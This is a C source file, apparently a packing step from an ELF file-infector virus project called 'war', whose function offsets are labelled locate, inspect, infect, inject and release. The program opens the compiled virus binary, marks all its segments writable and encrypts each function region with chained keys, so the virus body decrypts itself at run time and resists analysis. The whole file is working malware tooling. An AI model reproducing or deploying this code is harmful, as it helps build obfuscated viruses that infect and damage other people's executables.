#include "war.h"

#define ENT_ADDR	0x11fd // cypher_beg
#define F1_ADDR		0x12ce // war
#define F2_ADDR		0x14b3 // locate
#define F3_ADDR		0x18a9 // inspect
#define F4_ADDR		0x1b99 // infect
#define F5_ADDR		0x1ec6 // inject
#define F6_ADDR		0x21ba // release
#define F7_ADDR		0x2291 // cypher_end
#define F8_ADDR		0x22fc // end

#define ENT_SIZE	F1_ADDR - ENT_ADDR	// war - cypher_beg
#define F1_SIZE		F2_ADDR - F1_ADDR	// locate - war
#define F2_SIZE		F3_ADDR - F2_ADDR	// inspect - locate
#define F3_SIZE		F4_ADDR - F3_ADDR	// infect - inspect
#define F4_SIZE		F5_ADDR - F4_ADDR	// inject - infect
#define F5_SIZE		F6_ADDR - F5_ADDR	// release - inject
#define F6_SIZE		F7_ADDR - F6_ADDR	// cypher_end - release
#define F7_SIZE		F8_ADDR - F7_ADDR	// end - cypher_end

char *ptr;

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void segment_write(char *ptr)
{
	Elf64_Ehdr	*header = ( Elf64_Ehdr *)ptr;
	Elf64_Phdr	*segment;

	for (Elf64_Half index = 0; index < header->e_phnum; index++)
	{
		segment = (Elf64_Phdr *)((void *)ptr + sizeof(Elf64_Ehdr) + (sizeof(Elf64_Phdr) * index));
		segment->p_flags |= PF_W;
	}
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

int main(void)
{
	int		fd;
	char	*filename = "./war";
	t_key	keychain = {0};
	struct stat statbuf;

	if ((fd = open(filename, O_RDWR)) < 0)
	{
		perror("open");
		exit(0);
	}
	if (stat(filename, &statbuf) < 0)
	{
		perror("stat");
		exit(0);
	}
	if ((ptr = mmap(NULL, statbuf.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == NULL)
	{
		perror("mmap");
		exit(0);
	}

	segment_write(ptr);

	// release -> cypher_end
	update_one(&keychain, ptr + F6_ADDR, F6_SIZE);
	revert_one(&keychain, ptr + F7_ADDR, F7_SIZE);
	printf("cypher_end: start at [%p] size : %d key = %lx\n", ptr + F7_ADDR, F7_SIZE, keychain.one);

	// inject -> release
	update_two(&keychain, ptr + F5_ADDR, F5_SIZE);
	revert_two(&keychain, ptr + F6_ADDR, F6_SIZE);
	printf("release: start at [%p] size : %d key = %lx\n", ptr + F6_ADDR, F6_SIZE, keychain.two);

	// infect -> inject
	update_one(&keychain, ptr + F4_ADDR, F4_SIZE);
	revert_one(&keychain, ptr + F5_ADDR, F5_SIZE);
	printf("inject: start at [%p] size : %d key = %lx\n", ptr + F5_ADDR, F5_SIZE, keychain.one);

	// inspect -> infect
	update_two(&keychain, ptr + F3_ADDR, F3_SIZE);
	revert_two(&keychain, ptr + F4_ADDR, F4_SIZE);
	printf("infect : start at [%p] size : %d : key = %lx \n", ptr + F4_ADDR, F4_SIZE, keychain.two);

	// locate -> inspect
	update_one(&keychain, ptr + F2_ADDR, F2_SIZE);
	revert_one(&keychain, ptr + F3_ADDR, F3_SIZE);
	printf("inspect : start at [%p] size : %d : key = %lx\n", ptr + F3_ADDR, F3_SIZE, keychain.one);

	// war-> locate
	update_two(&keychain, ptr + F1_ADDR, F1_SIZE);
	revert_two(&keychain, ptr + F2_ADDR, F2_SIZE);
	printf("locate : start at [%p] size : %d key = %lx\n", ptr + F2_ADDR, F2_SIZE, keychain.two);

	// cypher_beg -> war
	update_one(&keychain, ptr + ENT_ADDR, ENT_SIZE);
	revert_one(&keychain, ptr + F1_ADDR, F1_SIZE);
	printf("war : start at [%p] size : %d key = %lx\n", ptr + F1_ADDR, F1_SIZE, keychain.one);

	write(fd, ptr, statbuf.st_size);
	munmap(ptr, statbuf.st_size);
	close(fd);
}
